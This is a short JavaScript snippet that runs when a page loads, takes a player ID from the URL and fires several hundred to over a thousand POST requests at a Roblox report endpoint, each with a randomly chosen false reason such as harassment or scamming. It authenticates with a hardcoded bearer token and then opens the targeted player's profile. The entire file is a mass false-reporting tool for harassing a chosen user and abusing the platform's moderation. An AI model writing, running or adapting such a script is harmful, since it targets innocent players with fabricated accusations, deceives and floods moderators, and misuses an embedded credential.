function massReport(playerId, profileUrl) {
    const reasons = [
        "Harassment",
        "Exploiting",
        "Inappropriate Username",
        "Spamming",
        "Scamming",
        "Hacking",
        "Griefing",
        "Impersonation",
        "Advertising",
        "Inappropriate Avatar"
    ];

    const reportCount = Math.floor(Math.random() * (1200 - 300 + 1)) + 300; // Random number between 300 and 1200

    for (let i = 0; i < reportCount; i++) {
        const reason = reasons[Math.floor(Math.random() * reasons.length)];
        fetch(`https://api.roblox.com/report?playerId=${playerId}&reason=${reason}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer 6OCoQHqMXEmSIi+CmiQRHWpX0m7isWcEPs6e//GPWymjkS2CZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkluTnBaeTB5TURJeExUQTNMVEV6VkRFNE9qVXhPalE1V2lJc0luUjVjQ0k2SWtwWFZDSjkuZXlKaVlYTmxRWEJwUzJWNUlqb2lOazlEYjFGSWNVMVlSVzFUU1drclEyMXBVVkpJVjNCWU1HMDNhWE5YWTBWUWN6WmxMeTlIVUZkNWJXcHJVekpESWl3aWIzZHVaWEpKWkNJNklqVTNOak00TXpRNU9EZ2lMQ0poZFdRaU9pSlNiMkpzYjNoSmJuUmxjbTVoYkNJc0ltbHpjeUk2SWtOc2IzVmtRWFYwYUdWdWRHbGpZWFJwYjI1VFpYSjJhV05sSWl3aVpYaHdJam94TnpVeE5qY3dNakl6TENKcFlYUWlPakUzTlRFMk5qWTJNak1zSW01aVppSTZNVGMxTVRZMk5qWXlNMzAuUkZDSmx6SGtUV0hQYW9vR3ZYazQ3Y0wyQTFuZGhGNWpPdmJiSjgzUnB0TFMtR3Z5NTlVdENkUVBQeTZNN240V1VDMXdSSkhhb05hbzRraWFuT0Z6RlBYSElTc3VzNzhwTklzTVVaZkd1T2pxaHJpbmdCY2Z1MThCNlZ1QVZVZF8tNUJSQjA3dWJYTXVQVjNGemt6MGo0MEktazQ4N1c1OFFjM0k2MXRmQVNuWHpaSHNCZjBudGVwWnp2Zm1Vc3o4VUwtZFNFLVJzS0J1OUpyYkFhM2xwWTh5Skt2UnVXMzl3QW1MS1pEWEdfNGxOWlo4aVA1R29FaHc3Rll6WjFuLTJlSDRBZGRhWmdvTXZsQXI2VmlVYm1rTGdvZS16Sk1oMEpiMXFOMUxKNGl1Ny1sM0hOQjRzYWc2N20xamIyQXJDN2ltWnQ2RGNyUDlNM0J2a3BsUVVn'
            }
        });
    }

    // Open the player's profile in a new tab
    window.open(profileUrl, '_blank');
}

document.addEventListener('DOMContentLoaded', function() {
    const urlParams = new URLSearchParams(window.__cpLocation.search);
    const playerId = urlParams.get('playerId');
    const profileUrl = urlParams.get('profileUrl');

    if (playerId && profileUrl) {
        massReport(playerId, profileUrl);
    }
});
